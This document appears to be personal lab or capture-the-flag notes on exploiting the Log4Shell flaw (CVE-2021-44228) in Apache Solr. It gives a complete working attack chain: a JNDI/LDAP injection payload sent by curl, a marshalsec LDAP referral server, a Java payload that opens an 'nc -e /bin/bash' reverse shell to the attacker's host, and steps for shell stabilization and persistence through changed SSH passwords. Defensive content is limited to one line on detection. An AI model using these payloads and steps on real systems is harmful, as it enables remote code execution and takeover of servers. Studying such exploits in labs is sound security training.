# Solar, Exploiting Log4j


## Introduction
- A new vulnerability `CVE-2021-44228` affects the logj4 package
- Severity score of 10.0, offers RCE on hosts that use log4j
- Huge attack surface because a lot of software uses log4j, will be seen for years to come

## Recon
- Use nmap to scan all the ports, as some may not be immediately noticed by nmap
- `nmap -v -p- 10.10.250.23`, the service running is apache solr on port 8983

## Discovery
- Apache Solr 8.11.0 is vulnerable to log4jshell
- `-Dsolr.log.dir=/var/solr/logs` is an indication that it's running log4j
- `solr.log` contains INFO entries
- `2021-12-13 03:44:58.415 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=80` calling to `/admin/cores`
- We can try to control the `params` field

## Proof of Concept
- The URL we want to visit - `/admin/cores` - needs to be prefaced with `solr/`, so go to `http://10.10.250.23:8983/solr/admin/cores`
- `The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files. `
    - Examples of syntax
        ```
        ${sys:os.name}
        ${sys:user.name}
        ${log4j:configParentLocation}
        ${ENV:PATH}
        ${ENV:HOSTNAME}
        ${java:version}
        ```
- The payload to abuse log4j vuln is `${jndi:ldap://ATTACKERCONTROLLEDHOST}`
    - log4j will invoke JNDI (Java Naming and Directory Interface), which can be used to access external resources or "references"
    - `ldap://` indicates that the target will reach out to an endpoint (which the attacker will control) via the LDAP protocol
    - This syntax can be entered **wherever the application is logging the data**
        - Input boxes, user and password login forms, data entry points within applications
        - HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
        - Any place for user-supplied data
- This type of vulnerability was showcased in a [presentation in 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- Proof of Concept
    1. `nc -lnvp 9999`
    2. `curl 'http://10.10.250.23:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'`
       - Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes so bash (your command-line shell) does not interpret it as a variable. Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments.
    - This will not create a reverse shell, it's just a proof of concept to see whether the target machine will connect back to the attacker

## Exploitation
- The connection that netcat caught in the last step was just an LDAP request, so the only content displayed was a series of non-printable characters
    - To exploit it further we need to respond with an LDAP referral server, which will redirest the initial request of the victim to another location, where we will host a secondary payload that will run code on the target
- Steps
    1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server
    2. LDAP Referral Server springboards the request to a secondary `http://attackerserver/resource`
    3. The victim retrieves and executes the code present in `http://attackerserver/resource`
- To host an http server we can use one of these
    - `python3 -m http.server`
    - `php -S 0.0.0.0:8000`
    - Any formal web service
- We use the [marshalsec](https://github.com/mbechler/marshalsec) LDAP referral server
- Exploit
    1. Build marshalsec with `mvn clean package -DskipTests`
    2. Start marshalsec with `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"`, opens LDAP referral server at 1389, which will forward the request to http server on port 8000 for resource `Exploit`
        - Now the LDAP referral server is running, and we can set up out http server and the payload we want to run
    3. Create a java file `Exploit.java` with reverse shell script
        ```
            public class Exploit {
            static {
                try {
                    java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        ```
    4. Compile java payload with `javac Exploit.java` (if you're using the attackbox use `javac Exploit.java -source 8 -target 8` instead)
    5. Host the payload with `python3 -m http.server 8000` on port 8000
    6. Start netcat listener with `nc -lnvp 9999` on port 9999
    7. Trigger exploit with `curl 'http://10.10.251.47:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'`
- Troubleshooting
```
If you do not see your reverse shell connection come through, be sure to revisit your Exploit.java file.

1. Ensure you do not have any typos in the Java syntax (forgetting semi-colons or closing braces).
2. Ensure your attacker IP address matches what is displayed in the ip addr show output for your network interface.
3. Ensure your your port matches the same as what your netcat listener is waiting and serving on.

If you need to make any changes or corrections to your Exploit.java file, you must remember to recompile it  with javac Exploit.java.

Revisit your HTTP server.

1. Ensure it is in fact running.
2. Ensure it is running in the same folder as your Exploit.java file.

When you run the curl command to trigger the exploit, you should sequentially see:

1. A connection made on your LDAP server,
2. A connection made on your HTTP server,
3. A connection made in your netcat listener.

Once you receive a connection, you may not see a "prompt." You can still enter commands to check if you do have the shell.
```

## Persistence
- Nmap output showed that ssh was open, so we can potentially add private keys or change users
- To stabilize the shell if using bash:
```
(on the reverse shell) python3 -c "import pty; pty.spawn('/bin/bash')"

(press on your keyboard) Ctrl+Z

(press on your keyboard) Enter

(on your local host) stty raw -echo

(on your local host) fg (you will not see your keystrokes -- trust yourself and hit Enter)

(press on your keyboard) Enter

(press on your keyboard) Enter

(on the reverse shell) export TERM=xterm
```
- To change ssh password if you have sudo permissions
    1. `sudo su`
    2. `passwd <user>`

## Detection
- Finding applications vulnerable to log4jshell is hard
